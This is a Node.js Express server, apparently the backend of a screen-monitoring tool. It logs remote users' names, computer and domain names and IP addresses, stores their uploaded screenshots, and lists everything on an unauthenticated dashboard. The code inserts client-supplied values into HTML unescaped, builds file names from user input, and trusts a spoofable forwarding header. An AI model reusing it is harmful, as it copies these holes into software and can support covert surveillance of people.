const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 3000;
let clients = {};

function ensureScreenshotsDirectoryExists() {
    const screenshotsDir = path.join(__dirname, 'screenshots');
    if (!fs.existsSync(screenshotsDir)) {
        fs.mkdirSync(screenshotsDir, { recursive: true });
        console.log('Screenshots directory created.');
    }
}

ensureScreenshotsDirectoryExists();


app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, path.join(__dirname, 'screenshots'));
    },
    filename: function (req, file, cb) {
        const ipAddress = getClientIp(req);

        const userName = Object.keys(clients).find(key => clients[key].ipAddress === ipAddress);
        if (!userName) {
            return cb(new Error('userName not found for the IP address'));
        }
        cb(null, `${userName}-screenshot.png`);
    }
});

const upload = multer({ storage: storage });

function getClientIp(req) {
    const xForwardedFor = req.headers['x-forwarded-for'];
    return xForwardedFor ? xForwardedFor.split(',')[0].trim() : req.ip;
}

app.post('/upload_screenshot', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).send('Invalid request: Missing file');
    }
    console.log(`Screenshot saved successfully: ${req.file.path}`);
    res.send('Screenshot received');
});

// Обработчик для загрузки данных о пользователе
app.post('/upload', (req, res) => {
    const userName = req.body.userName;
    const computerName = req.body.computerName;
    const domainName = req.body.domainName;
    const ipAddress = getClientIp(req);

    console.log("Received POST request");
    console.log("userName:", userName);
    console.log("computerName:", computerName);
    console.log("domainName:", domainName);
    console.log("IP-address:", ipAddress);

    if (!userName || !computerName || !domainName) {
        return res.status(400).send("Invalid request");
    }

    clients[userName] = {
        computerName,
        domainName,
        ipAddress,
        last_active: Date.now()
    };

    res.send("OK");
});

// Обработчик для отображения данных о клиентах
app.get('/', (req, res) => {
    let htmlContent = "<h1>Clients Data</h1><ul>";

    for (let userName in clients) {
        const screenshotPath = `/screenshots/${userName}-screenshot.png`;

        htmlContent += `<li>
            <strong>UserName:</strong> ${userName}<br>
            <strong>ComputerName:</strong> ${clients[userName].computerName}<br>
            <strong>DomainName:</strong> ${clients[userName].domainName}<br>
            <strong>IP Address:</strong> ${clients[userName].ipAddress}<br>
            <strong>Last Active:</strong> ${new Date(clients[userName].last_active).toLocaleString()}<br>
            <strong>Last Screenshot: </strong> <br>
            <img src="${screenshotPath}" alt="Screenshot" style="max-width: 300px;"/><br>
        </li>`;
    }

    htmlContent += "</ul>";

    res.send(htmlContent);
});

// Статическая папка для скриншотов
app.use('/screenshots', express.static(path.join(__dirname, 'screenshots')));

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
